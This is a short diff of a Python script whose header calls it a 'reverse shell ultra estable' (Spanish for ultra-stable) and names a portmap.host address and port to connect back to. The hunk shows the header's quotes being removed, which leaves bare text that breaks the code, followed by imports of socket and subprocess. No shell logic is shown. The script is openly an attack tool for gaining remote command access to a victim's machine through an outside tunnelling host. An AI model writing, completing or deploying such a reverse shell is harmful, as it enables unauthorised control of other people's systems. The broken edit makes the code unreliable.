@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
-"""
+
 REVERSE SHELL ULTRA ESTABLE - PORTMAP.IO
 Conecta a: Astrazam-37147.portmap.host:37147
-"""
+
 
 import socket
 import subprocess
